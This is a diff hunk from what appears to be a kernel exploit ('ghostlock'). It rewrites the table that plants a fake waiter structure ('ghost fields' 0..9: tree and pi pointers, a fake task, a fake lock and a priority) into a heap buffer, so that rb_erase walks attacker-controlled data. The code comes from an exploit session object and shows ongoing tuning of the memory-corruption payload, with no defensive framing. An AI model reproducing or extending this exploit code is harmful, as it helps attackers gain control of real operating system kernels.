@@ -44,30 +44,31 @@ namespace ghostlock::route {
     __extension__ unsigned char stamp[stamp_size]; // NOLINT(clang-analyzer-core.VLASize)
         memset(stamp, 0, sizeof(stamp));
 
-        /* v12.0: plant the FULL compact=2 waiter image (ghost words 2..11),
-         * the same field table the select route stamps — rb_erase needs the
-         * tree/pi parents, and the old task+lock-only stamp left those at 0
-         * so the walk derailed. Ghost word N sits at gsr word
-         * (waiter_off/8 + N). */
+        /* v12.2b: plant the FULL compact image — ghost FIELDS 0..9 (the
+         * mcast carrier reaches the struct base, unlike the fd_set window
+         * which starts at the select route's word 2). Same field sequence
+         * as the select route's table, reindexed from the struct base:
+         * tree_pc, tree_right, tree_left, pi_pc, pi_right, pi_left, task,
+         * lock, prio, deadline. */
         const uint64_t prio_word = static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO);
         const struct {
-            int32_t word;
+            int32_t field;
             uint64_t value;
         } words[] = {
-                {2, (session::g_exploit_session.heap.current.fake_right)},
-                {3, 0},
-                {4, request->target},
-                {5, (session::g_exploit_session.heap.current.fake_right)},
-                {6, 0},
-                {7, request->target},
-                {8, (session::g_exploit_session.heap.current.fake_task)},
-                {9, (session::g_exploit_session.heap.current.fake_lock)},
-                {10, prio_word},
-                {11, 0},
+                {0, (session::g_exploit_session.heap.current.fake_right)},
+                {1, 0},
+                {2, request->target},
+                {3, (session::g_exploit_session.heap.current.fake_right)},
+                {4, 0},
+                {5, request->target},
+                {6, (session::g_exploit_session.heap.current.fake_task)},
+                {7, (session::g_exploit_session.heap.current.fake_lock)},
+                {8, prio_word},
+                {9, 0},
         };
         bool encoded = true;
         for (const auto &w: words) {
-            size_t byte = waiter_off + static_cast<size_t>(w.word) * 8;
+            size_t byte = waiter_off + static_cast<size_t>(w.field) * 8;
             if (byte + 8 > stamp_size) {
                 encoded = false;
                 break;
